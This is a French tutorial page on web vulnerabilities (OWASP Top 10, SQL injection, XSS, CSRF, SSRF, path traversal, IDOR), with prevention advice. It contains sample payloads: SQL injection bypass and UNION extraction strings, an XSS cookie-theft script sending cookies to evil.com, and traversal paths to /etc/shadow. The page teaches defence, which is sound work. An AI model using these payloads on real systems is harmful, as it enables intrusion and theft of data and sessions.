---
title: Vulnérabilités web
description: OWASP Top 10, injection SQL, XSS, CSRF, SSRF — comprendre et prévenir les principales vulnérabilités des applications web.
category: hacking
slug: web
order: 8
---

## OWASP Top 10 {#owasp}

L'**OWASP Top 10** est un classement des vulnérabilités web les plus critiques, mis à jour régulièrement par l'Open Web Application Security Project.

| #   | Catégorie (2021)                           | Description                                    |
| --- | ------------------------------------------ | ---------------------------------------------- |
| 1   | Broken Access Control                      | Accès à des ressources non autorisées          |
| 2   | Cryptographic Failures                     | Chiffrement faible ou absent                   |
| 3   | Injection                                  | SQL, NoSQL, OS, LDAP injection                 |
| 4   | Insecure Design                            | Failles de conception architecturale           |
| 5   | Security Misconfiguration                  | Configuration par défaut, ports ouverts        |
| 6   | Vulnerable and Outdated Components         | Bibliothèques avec des CVE connues             |
| 7   | Identification and Authentication Failures | Authentification faible, sessions mal gérées   |
| 8   | Software and Data Integrity Failures       | Mises à jour non vérifiées, CI/CD non sécurisé |
| 9   | Security Logging and Monitoring Failures   | Absence de logs, détection impossible          |
| 10  | Server-Side Request Forgery (SSRF)         | Le serveur effectue des requêtes arbitraires   |

## Injection SQL {#sqli}

L'injection SQL se produit quand des données utilisateur sont insérées directement dans une requête SQL sans validation ni échappement.

### Comment ça fonctionne

```
Requête normale :
SELECT * FROM users WHERE username = 'admin' AND password = 'secret'

Injection :
SELECT * FROM users WHERE username = '' OR 1=1--' AND password = ''
                                         ^^^^^^^^
                        La condition est toujours vraie  →  accès accordé
```

Le `--` commente le reste de la requête, rendant la vérification du mot de passe inutile.

### Types d'injection SQL

| Type                | Principe                                         | Détection                                |
| ------------------- | ------------------------------------------------ | ---------------------------------------- |
| **Union-based**     | Utilise `UNION SELECT` pour extraire des données | Résultats visibles dans la page          |
| **Error-based**     | Exploite les messages d'erreur SQL               | Erreurs SQL affichées                    |
| **Blind (boolean)** | Pose des questions vrai/faux via la réponse      | Réponses différentes selon la condition  |
| **Blind (time)**    | Utilise `SLEEP()` pour déduire des informations  | Temps de réponse variable                |
| **Out-of-band**     | Exfiltre via DNS ou HTTP                         | Rare, nécessite des conditions spéciales |

### Exemple vulnérable vs corrigé

**Code PHP vulnérable :**

```php
// VULNERABLE: user input concatenated directly into SQL query
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'
          AND password = '" . $_POST['password'] . "'";
$result = mysqli_query($conn, $query);
```

**Code PHP corrigé :**

```php
// SECURE: parameterized query prevents SQL injection
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $_POST['username'], $_POST['password']);
$stmt->execute();
$result = $stmt->get_result();
```

### Payloads courants

```sql
-- Login bypass
' OR 1=1--
' OR 'a'='a
admin'--

-- Extract database version
' UNION SELECT NULL,version()--

-- List tables
' UNION SELECT NULL,table_name FROM information_schema.tables--

-- Extract columns
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--

-- Extract data
' UNION SELECT username,password FROM users--
```

## Cross-Site Scripting (XSS) {#xss}

Le **XSS** permet d'injecter du code JavaScript dans une page web vue par d'autres utilisateurs.

### Types de XSS

| Type          | Stockage         | Déclenchement                   | Gravité |
| ------------- | ---------------- | ------------------------------- | ------- |
| **Reflected** | Non (dans l'URL) | Clic sur un lien malveillant    | Moyen   |
| **Stored**    | Oui (en BDD)     | Visite de la page compromise    | Élevé   |
| **DOM-based** | Non              | Manipulation du DOM côté client | Moyen   |

### Exemple de XSS reflected

```
URL malveillante :
https://site.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

### Payloads courants

```html
<!-- Basic alert (proof of concept) -->
<script>
    alert("XSS");
</script>

<!-- Cookie theft -->
<script>
    document.location = "https://evil.com/steal?c=" + document.cookie;
</script>

<!-- Event handler (bypasses some filters) -->
<img src="x" onerror="alert('XSS')" />

<!-- SVG-based -->
<svg onload="alert('XSS')">
    <!-- Without script tags -->
    <body onload="alert('XSS')"></body>
</svg>
```

### Prévention

```javascript
// VULNERABLE: inserting user input directly into HTML
element.innerHTML = userInput;

// SECURE: use textContent instead (escapes HTML)
element.textContent = userInput;
```

**Mesures de protection :**

- **Échapper** les données avant l'affichage (HTML entities : `<` → `&lt;`)
- **Content Security Policy (CSP)** — Restreindre les sources de scripts autorisées
- **HttpOnly** sur les cookies — Empêche l'accès via JavaScript
- **Validation côté serveur** — Ne jamais faire confiance aux données client

## Cross-Site Request Forgery (CSRF) {#csrf}

Le **CSRF** force un utilisateur authentifié à exécuter une action non désirée sur un site où il est connecté.

```
1. Victime connectée sur banque.com (cookie de session actif)
2. Victime visite evil.com
3. evil.com contient :
   <img src="https://banque.com/transfer?to=attacker&amount=1000">
4. Le navigateur envoie la requête avec le cookie de session → transfert effectué
```

### Prévention

- **Token CSRF** — Un token unique par formulaire, vérifié côté serveur
- **SameSite cookies** — Empêche l'envoi de cookies dans les requêtes cross-site
- **Vérification du Referer/Origin** — Rejeter les requêtes provenant d'autres domaines

## Server-Side Request Forgery (SSRF) {#ssrf}

Le **SSRF** permet de faire exécuter des requêtes HTTP par le serveur vers des ressources internes ou externes.

```
Requête normale :
Client  →  Serveur  →  https://api-publique.com/data

SSRF :
Client  →  Serveur  →  http://localhost:8080/admin    (accès au réseau interne)
Client  →  Serveur  →  http://169.254.169.254/...     (metadata cloud AWS/GCP)
```

**Impact potentiel :**

- Accès aux services internes (bases de données, panneaux d'administration)
- Lecture des métadonnées cloud (identifiants AWS, tokens)
- Scan de ports internes
- Exfiltration de données

## Autres vulnérabilités courantes {#others}

### Broken authentication

- Sessions qui n'expirent pas
- IDs de session prévisibles
- Pas de protection contre le brute force sur le login
- Mots de passe stockés en clair (voir [Mots de passe](/help/hacking/passwords))

### Directory traversal

Accéder à des fichiers en dehors du répertoire web :

```
https://site.com/file?name=../../../../etc/passwd
https://site.com/download?path=../../../etc/shadow
```

### Insecure Direct Object Reference (IDOR)

Accéder aux données d'autres utilisateurs en modifiant un identifiant :

```
https://site.com/invoice?id=1001    (votre facture)
https://site.com/invoice?id=1002    (facture d'un autre utilisateur → IDOR)
```

## Récapitulatif {#summary}

| Vulnérabilité           | Impact                           | Prévention                                  |
| ----------------------- | -------------------------------- | ------------------------------------------- |
| **SQL Injection**       | Accès complet à la BDD           | Requêtes préparées, ORM                     |
| **XSS**                 | Vol de session, défacement       | Échappement, CSP, HttpOnly                  |
| **CSRF**                | Actions non consenties           | Tokens CSRF, SameSite cookies               |
| **SSRF**                | Accès au réseau interne          | Whitelist d'URLs, blocage de plages privées |
| **Directory traversal** | Lecture de fichiers système      | Validation de chemins, chroot               |
| **IDOR**                | Accès aux données d'autres users | Contrôle d'accès côté serveur               |

## Outils web {#tools}

| Outil                | Usage                                   |
| -------------------- | --------------------------------------- |
| **Burp Suite**       | Proxy d'interception, scanner, repeater |
| **OWASP ZAP**        | Alternative open source à Burp Suite    |
| **Browser DevTools** | Inspecter les requêtes, cookies, DOM    |
| **SQLMap**           | Automatisation de l'injection SQL       |
| **XSSStrike**        | Détection et exploitation de XSS        |
| **Nikto**            | Scanner de vulnérabilités web           |

## Pour aller plus loin {#next}

- [Scanning et énumération](/help/hacking/scanning) — découvrir les services web exposés
- [Mots de passe](/help/hacking/passwords) — attaques sur l'authentification
- [Boîte à outils](/help/hacking/tools) — Burp Suite, OWASP ZAP et autres outils web